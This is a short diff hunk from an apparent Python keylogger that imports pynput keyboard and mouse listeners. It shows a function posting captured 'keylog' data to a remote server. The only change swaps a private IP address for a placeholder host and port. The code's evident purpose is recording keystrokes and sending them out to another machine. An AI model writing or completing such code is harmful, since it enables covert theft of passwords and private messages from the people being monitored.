@@ -3,7 +3,7 @@ from pynput import keyboard, mouse
 import requests
 
 def send_data_to_server(data):
-	url = 'http://192.168.29.12:5000/receive-data'
+	url = 'http://<server-ip>:12345/receive-data'
 	payload = {'keylog': data}
 	requests.post(url, data=payload)
     
